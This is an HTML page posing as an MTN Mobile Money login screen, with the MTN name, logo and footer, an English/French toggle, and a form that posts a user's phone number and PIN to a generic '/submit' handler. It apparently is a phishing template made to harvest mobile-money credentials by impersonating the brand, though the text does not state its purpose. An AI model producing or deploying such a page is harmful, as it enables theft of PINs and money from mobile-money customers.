<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>MTN Mobile Money Login</title>
  <style>
    body {
      font-family: "Segoe UI", sans-serif;
      background-color: #f7f7f7;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .logo {
      margin-top: 40px;
      width: 120px;
    }

    .page-heading {
      text-align: center;
      font-size: 26px;
      color: #000;
      margin-top: 15px;
    }

    .language-toggle {
      margin-top: 10px;
      text-align: center;
    }

    .language-toggle button {
      margin: 0 5px;
      padding: 5px 10px;
      border: none;
      background-color: #ffcc00;
      color: #000;
      font-weight: bold;
      border-radius: 4px;
      cursor: pointer;
    }

    .login-box {
      background-color: #fff;
      padding: 25px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
      width: 350px;
      margin-top: 20px;
    }

    h2 {
      text-align: center;
      color: #2a2a2a;
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-bottom: 6px;
      color: #333;
      font-weight: bold;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    input[type="submit"] {
      background-color: #ffcc00;
      color: #000;
      border: none;
      padding: 12px;
      width: 100%;
      font-weight: bold;
      border-radius: 5px;
      cursor: pointer;
    }

    input[type="submit"]:hover {
      background-color: #e6b800;
    }

    .footer {
      margin-top: 20px;
      text-align: center;
      font-size: 12px;
      color: #888;
    }
  </style>
</head>
<body>

  <!-- Logo -->
  <img src="/mtn-logo.png" alt="MTN Logo" class="logo" />
  <h1 class="page-heading" id="page-title">MTN Mobile Money</h1>

  <!-- Language toggle -->
  <div class="language-toggle">
    <button onclick="setLanguage('en')">English</button>
    <button onclick="setLanguage('fr')">Français</button>
  </div>

  <!-- Login Form -->
  <div class="login-box">
    <h2 id="form-title">Login Form</h2>
    <form action="/submit" method="POST">
      <label id="label-phone" for="phone">Phone Number</label>
      <input type="text" id="phone" name="phone" required />

      <label id="label-pin" for="pin">PIN</label>
      <input type="password" id="pin" name="pin" required />

      <input id="submit-btn" type="submit" value="Log In" />
    </form>
    <div class="footer">&copy; 2025 MTN Group | Mobile Money</div>
  </div>

  <!-- Language Script -->
  <script>
    const translations = {
      en: {
        title: "MTN Mobile Money",
        formTitle: "Login",
        phone: "Phone Number",
        pin: "PIN",
        login: "Log In"
      },
      fr: {
        title: "MTN Mobile Money",
        formTitle: "Connexion",
        phone: "Numéro de téléphone",
        pin: "Code PIN",
        login: "Connexion"
      }
    };

    function setLanguage(lang) {
      document.getElementById("page-title").innerText = translations[lang].title;
      document.getElementById("form-title").innerText = translations[lang].formTitle;
      document.getElementById("label-phone").innerText = translations[lang].phone;
      document.getElementById("label-pin").innerText = translations[lang].pin;
      document.getElementById("submit-btn").value = translations[lang].login;
    }
  </script>

</body>
</html>
